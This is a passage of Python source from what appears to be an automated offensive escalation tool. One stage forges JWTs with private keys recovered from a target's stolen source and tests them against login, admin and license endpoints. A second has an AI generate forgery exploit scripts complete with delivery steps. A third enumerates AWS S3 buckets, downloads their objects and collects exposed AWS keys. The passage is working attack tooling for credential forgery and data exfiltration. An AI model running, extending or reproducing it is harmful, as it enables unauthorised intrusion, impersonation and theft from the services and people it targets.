                              for u in candidates[:10]])
        stage.notes.append(f"probed {len(candidates)} endpoints with "
                            f"{rep.probes_sent} payloads; "
                            f"{len(rep.findings)} SQLi findings")

    # ------------------------------------------------------------------ #
    # L14: Crypto attacks (JWT / key reuse) using recovered keys
    # ------------------------------------------------------------------ #
    async def _l14_crypto_attacks(self, stage: EscalationStage,
                                   report: EscalationReport):
        # Discover all .pem private keys we recovered
        source_dir = self.out_dir / "recovered_source"
        private_keys: list = []
        if source_dir.exists():
            for p in source_dir.rglob("*"):
                if p.is_file() and p.suffix.lower() in (".pem", ".key"):
                    try:
                        if b"BEGIN" in p.read_bytes()[:200] and b"PRIVATE KEY" in p.read_bytes()[:200]:
                            private_keys.append(p)
                    except Exception:
                        pass
        # Candidate endpoints — ONLY on the actual target, never upstream URLs
        # (probing JWT bypass against github.com is meaningless and produces
        # false-positive 'accepted' verdicts).
        target_host = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        endpoints: list[str] = []
        for st in report.stages:
            for p in st.probes:
                if not (200 <= p.status < 300 and p.size > 0):
                    continue
                if target_host not in p.url:
                    continue
                endpoints.append(p.url)
        for known in ("/", "/login.php", "/index.php", "/admin",
                       "/api/", "/api/index.php", "/newlicense.php",
                       "/viewlicenses.php"):
            endpoints.append(f"{self.target}{known}")
        endpoints = list(dict.fromkeys(endpoints))[:20]

        stage.artifacts["private_keys"] = [str(p.relative_to(source_dir))
                                            for p in private_keys] if source_dir.exists() else []
        stage.artifacts["endpoints"] = endpoints

        if not private_keys and not endpoints:
            stage.notes.append("no keys and no endpoints — skipping")
            return

        rep = await forge_and_test(self.client, self.target, private_keys, endpoints)
        stage.artifacts["jwts_discovered"] = len(rep.discovered_jwts)
        stage.artifacts["forgery_tests"] = len(rep.forged_token_tests)
        stage.artifacts["accepted_tokens"] = sum(1 for t in rep.forged_token_tests
                                                  if t.get("accepted"))

        for f in rep.findings:
            stage.findings.append(Finding(
                rule_id=f"crypto-{f.technique}",
                severity=f.severity,
                description=f.detail,
                match=f.technique[:200], redacted=f.technique[:80],
                line=f.endpoint[:240], line_no=0,
                file_path=f.endpoint, source="L14-crypto",
                extra={"technique": f.technique},
            ))

        # Stash for L15
        self._last_crypto = {
            "private_keys": [str(p) for p in private_keys],
            "discovered_jwts": rep.discovered_jwts,
            "accepted_forgeries": [t for t in rep.forged_token_tests if t.get("accepted")],
        }
        stage.notes.append(
            f"{len(private_keys)} private keys; "
            f"{len(rep.discovered_jwts)} JWTs observed; "
            f"{stage.artifacts['accepted_tokens']} forged tokens accepted; "
            f"{len(rep.findings)} findings"
        )

    # ------------------------------------------------------------------ #
    # L15: AI Forgery Lab — proof-of-impact generator
    # ------------------------------------------------------------------ #
    async def _l15_forgery_lab(self, stage: EscalationStage,
                                report: EscalationReport):
        source_dir = self.out_dir / "recovered_source"
        if not source_dir.exists() or not any(source_dir.rglob("*")):
            stage.notes.append("no recovered source — skipping forgery lab")
            return
        # Discover private keys
        private_keys = []
        for p in source_dir.rglob("*"):
            if p.is_file() and p.suffix.lower() in (".pem", ".key"):
                try:
                    if b"PRIVATE KEY" in p.read_bytes()[:200]:
                        private_keys.append(p)
                except Exception:
                    pass
        if not private_keys:
            stage.notes.append("no private keys recovered — skipping forgery")
            return
        ctx = {
            "stages_summary": [
                {"name": s.name, "level": s.level,
                 "notes": s.notes[:3]} for s in report.stages
            ],
            "recovered_jwts": getattr(self, "_last_crypto", {}).get("discovered_jwts", []),
        }
        result = await generate_forgery(
            self.target, source_dir, private_keys, ctx,
            session_id=f"{self._ai_session}-forgery",
            out_dir=self.out_dir,
        )
        stage.artifacts["forgery_result"] = result
        if result and not result.get("error"):
            stage.notes.append(
                f"forgery script: {result.get('filename')} "
                f"(confidence={result.get('confidence')}); "
                f"saved to {result.get('saved_to')}"
            )
            # Surface as a finding so it appears in the secrets/findings UI
            stage.findings.append(Finding(
                rule_id="ai-forgery-script",
                severity="critical",
                description=result.get("expected_impact", "Forgery PoC generated"),
                match=result.get("filename", ""),
                redacted=result.get("filename", ""),
                line=result.get("expected_impact", "")[:240],
                line_no=0,
                file_path=result.get("saved_to", ""),
                source="L15-forgery",
                extra={"delivery_steps": result.get("delivery_steps") or [],
                        "confidence": result.get("confidence")},
            ))
        else:
            stage.notes.append(f"forgery generation failed: {(result or {}).get('error')}")

    # ------------------------------------------------------------------ #
    # L16: AWS S3 enumeration & exfiltration
    # ------------------------------------------------------------------ #
    async def _l16_s3_enum(self, stage: EscalationStage,
                            report: EscalationReport):
        artifacts = dict(self.artifacts)
        # Seed with any user-supplied hints (e.g. extra buckets to probe)
        artifacts.setdefault("s3_hints", self.artifacts.get("s3_hints") or [])
        s3_report = await run_s3_enumeration(
            self.client,
            self.target,
            artifacts,
            self.out_dir,
            log=self.log,
        )
        # Merge findings
        for f in s3_report.findings:
            stage.findings.append(f)
        # Synthesize probes
        for b in s3_report.buckets:
            host = (f"{b.name}.s3.{b.region}.amazonaws.com" if b.region
                    else f"{b.name}.s3.amazonaws.com")
            stage.probes.append(Probe(
                method="GET",
                url=f"https://{host}/",
                status=(200 if b.list_allowed else (403 if b.accessible else 404)),
                size=b.object_count,
                bypass="bucket-probe",
                note=f"{b.error_code or ('LIST-OPEN' if b.list_allowed else 'EXISTS')}",
            ))
        for obj in s3_report.objects_downloaded:
            stage.probes.append(Probe(
                method="GET", url=f"s3://{obj['bucket']}/{obj['key']}",
                status=200, size=obj["size"], bypass="object-fetched",
                note=obj["saved_to"],
            ))
        stage.artifacts["buckets"] = [
            {"name": b.name, "region": b.region, "accessible": b.accessible,
             "list_allowed": b.list_allowed, "object_count": b.object_count,
             "error_code": b.error_code}
            for b in s3_report.buckets
        ]
        stage.artifacts["objects_downloaded"] = len(s3_report.objects_downloaded)
        stage.artifacts["aws_keys_found"] = s3_report.aws_keys_found
        stage.notes.extend(s3_report.notes)
